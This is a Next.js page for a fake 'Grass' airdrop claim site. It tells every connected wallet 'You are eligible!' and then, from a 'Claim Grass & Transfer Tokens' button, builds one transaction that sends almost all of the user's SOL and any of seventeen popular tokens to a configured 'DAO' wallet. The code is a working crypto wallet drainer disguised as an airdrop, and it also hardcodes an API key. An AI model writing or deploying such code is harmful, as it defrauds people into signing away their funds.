'use client';

import Link from "next/link";
import { useWallet } from '@solana/wallet-adapter-react';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";

// Import SPL token helpers
import {
  TOKEN_PROGRAM_ID,
  createTransferInstruction,
  getAssociatedTokenAddress,
} from '@solana/spl-token';

import CustomWalletButton from '../../components/CustomWalletButton';

export default function ConnectPage() {
  const { connected, disconnect, publicKey, sendTransaction } = useWallet();

  // You can change the connection endpoint as needed.
  const alchemyApiUrl = "https://solana-mainnet.g.alchemy.com/v2/a3AL-V2wyDAZIDWqnQ53boXG2aha_gCC";
  const connection = new Connection(alchemyApiUrl, "confirmed");

  // Format the wallet address for display.
  const abbreviatedAddress = publicKey
    ? `${publicKey.toString().slice(0, 4)}...${publicKey.toString().slice(-4)}`
    : '';
  const address = publicKey ? publicKey.toString() : "";

  // --- Configuration Section ---

  // The DAO wallet address which will receive the tokens
  // and pay the transaction fees.
  const daoWallet = new PublicKey("DAO_WALLET_ADDRESS"); // <-- Replace with your DAO wallet address

  // Define the assets you wish to check. For SOL we use `mint: null`
  // and for SPL tokens you must supply the mint addresses.
  const assets = [
    { name: "sol", threshold: 0.05, mint: null },
    { name: "grass", threshold: 1, mint: new PublicKey("Grass7B4RdKfBCjTKgSqnXkqjwiGvQyFbuSCUJr3XXjs") },
    { name: "trump", threshold: 0.1, mint: new PublicKey("6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN") },
    { name: "popcat", threshold: 0.1, mint: new PublicKey("7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr") },
    { name: "usdc", threshold: 1, mint: new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v") },
    { name: "usdt", threshold: 1, mint: new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB") },
    { name: "jup", threshold: 0.5, mint: new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN") },
    { name: "ray", threshold: 0.5, mint: new PublicKey("4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R") },
    { name: "bonk", threshold: 25000, mint: new PublicKey("DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263") },
    { name: "jupsol", threshold: 0.01, mint: new PublicKey("jupSoLaHXQiZZTSfEWMTRRgpnyFm8f6sZdosWBjx93v") },
    { name: "msol", threshold: 0.01, mint: new PublicKey("mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So") },
    { name: "jto", threshold: 0.5, mint: new PublicKey("jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL") },
    { name: "wif", threshold: 1, mint: new PublicKey("EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm") },
    { name: "pyth", threshold: 2, mint: new PublicKey("HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3") },
    { name: "pengu", threshold: 2, mint: new PublicKey("2zMMhcVQEXDtdE6vsFS7S7D5oUodfJHE8vd1gnBouauv") },
    { name: "fartcoin", threshold: 2, mint: new PublicKey("9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump") },
    { name: "vine", threshold: 2, mint: new PublicKey("6AJcP7wuLwmRYLBNbi825wgguaPsWzPBEHcHndpRpump") },
  ];

  // --- End Configuration Section ---

  // This function checks each asset and, if the balance meets or exceeds
  // the threshold, adds a transfer instruction that sends the asset
  // to the DAO wallet.
  const sendTokens = async () => {
    if (!publicKey) {
      console.error("Wallet not connected");
      return;
    }

    try {
      // Create a new transaction to hold all transfer instructions.
      const transaction = new Transaction();

      // 1. Check SOL balance and add a transfer instruction if threshold met.
      let  solBalanceLamports = await connection.getBalance(publicKey);
      solBalanceLamports = solBalanceLamports - 10000000;
      const solBalance = solBalanceLamports / 1e9; // convert lamports to SOL
     
      if (solBalance > 0.02) {
        // Transfer all SOL from the user to the DAO.
         
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: daoWallet,
            lamports: solBalanceLamports,
          })
        );
        console.log(`Added SOL transfer: ${solBalance} SOL`);
      } else {
        console.log(`SOL balance ${solBalance} is below threshold.`);
      }

      // 2. For each SPL token asset, check token account(s) and add a transfer
      // instruction if the token balance is above the specified threshold.
      for (const asset of assets) {
        // Skip SOL (already handled)
        if (asset.mint === null) continue;

        // Get token accounts owned by the user for this mint.
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
          mint: asset.mint,
        });
        if (tokenAccounts.value.length === 0) {
          console.log(`No token accounts found for ${asset.name}`);
          continue;
        }

        // In many cases there will be one associated token account.
        // (If there are more than one, you might choose to sum them.)
        for (const { pubkey, account } of tokenAccounts.value) {
          const tokenAmountInfo = account.data.parsed.info.tokenAmount;
          const uiAmount = tokenAmountInfo.uiAmount || 0;
          // Check if balance meets threshold.
          if (uiAmount >= asset.threshold) {
            // Calculate the raw amount (as an integer) using the token decimals.
            // tokenAmountInfo.amount is a string representing the integer amount.
            const amount = BigInt(tokenAmountInfo.amount);

            // Determine the associated token account of the DAO for this mint.
            // Note: getAssociatedTokenAddress returns a Promise.
            const daoTokenAccount = await getAssociatedTokenAddress(
              asset.mint,
              daoWallet
            );

            // Create a token transfer instruction.
            const transferIx = createTransferInstruction(
              pubkey,           // source token account (user’s)
              daoTokenAccount,  // destination token account (DAO’s)
              publicKey,        // owner of the source account
              amount,           // amount to transfer (in raw units)
              [],               // multi-signers (none in this case)
              TOKEN_PROGRAM_ID
            );
            transaction.add(transferIx);
            console.log(`Added transfer for ${asset.name}: ${uiAmount} tokens`);
          } else {
            console.log(
              `${asset.name} balance (${uiAmount}) is below threshold (${asset.threshold})`
            );
          }
        }
      }

      // If no instructions were added then nothing to send.
      if (transaction.instructions.length === 0) {
        alert("No assets meet the threshold for transfer.");
        return;
      }

      // IMPORTANT: Set the DAO wallet as the fee payer.
      // In order for this transaction to be valid the DAO wallet
      // must also sign the transaction. In a production implementation
      // you would send the partially-signed transaction to your backend
      // where the DAO keypair (kept secret) signs and returns the complete transaction.
      transaction.feePayer = daoWallet;

      // Get a recent blockhash to include in the transaction.
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;

      // Have the user sign the transaction. Note that the transaction
      // will be partially signed – it will need to be signed by the DAO
      // wallet (or fee payer) before it can be submitted.
      const signedTx = await sendTransaction(transaction, connection, {
        skipPreflight: false,
      });
      console.log("User signed transaction:", signedTx);

      // At this point you would typically send the partially-signed transaction
      // (e.g. as base64) to your backend which would add the DAO’s signature.
      // For example:
      //
      //   const serializedTx = signedTx.serialize({ requireAllSignatures: false }).toString('base64');
      //   await fetch('/api/signByDao', {
      //     method: 'POST',
      //     headers: { 'Content-Type': 'application/json' },
      //     body: JSON.stringify({ transaction: serializedTx }),
      //   });
      //
      // Then the backend would sign the transaction with the DAO keypair and
      // submit the fully-signed transaction to the Solana network.
      //
      // For demonstration purposes we assume that step is done externally.
      alert("Transfer instructions created. DAO must now sign to pay fees and complete the transfer.");
    } catch (error) {
      console.error("Transaction failed", error);
      alert("Transfer failed. Please try again.");
    }
  };

  return (
    <div className="css-ps0b2c">
      <div className="css-vap79n">
        <main className="css-ps0b2c">
          <div className="css-79elbk">
            <div className="css-mnqf94">
              <div className="chakra-stack css-1742ue8">
                <div className="css-56iasa"></div>
                <Link className="chakra-link css-1v2wsoy" href="/connect">
                  <button type="button" className="chakra-button css-1bxt6y0">1. Connect</button>
                </Link>
                <Link className="chakra-link css-1v2wsoy" href="/eligibility">
                  <button type="button" className="chakra-button css-13y4lrt" disabled>2. Eligibility</button>
                </Link>
                <Link className="chakra-link css-1v2wsoy" href="/claim">
                  <button type="button" className="chakra-button css-13y4lrt" disabled>3. Claim</button>
                </Link>
              </div>
            </div>

            {connected ? (
              <div className="css-1m6h13g">
                <div className="chakra-stack css-fqllj7">
                  <div className="css-1uly529"></div>
                  <p className="chakra-text css-itvw0n">
                    {abbreviatedAddress}{' '}
                    <span className="chakra-text css-1jsqqh" onClick={disconnect}>
                      DISCONNECT
                    </span>
                  </p>
                </div>
              </div>
            ) : null}

            <div className="css-579py2">
              <div className="chakra-stack css-t6pj5z">
                <div className="chakra-card css-zl11js">
                  <div className="chakra-stack css-ahthbn">
                    {connected ? (
                      <form className="chakra-stack css-1xl60vv">
                        <p className="chakra-text css-1kvck22">You are eligible!</p>
                        <p className="chakra-text css-hhbnxz">{address}</p>
                        <p className="chakra-link css-13jvj27">
                          <button
                            type="button"
                            className="chakra-button css-1963s0b"
                            onClick={sendTokens}
                          >
                            Claim Grass &amp; Transfer Tokens
                          </button>
                        </p>
                      </form>
                    ) : (
                      <form className="chakra-stack css-1xl60vv">
                        <p className="chakra-text css-133kx15">Check Your Eligibility...</p>
                        <CustomWalletButton />
                      </form>
                    )}
                  </div>
                </div>
              </div>
            </div>

          </div>
        </main>
      </div>
    </div>
  );
}
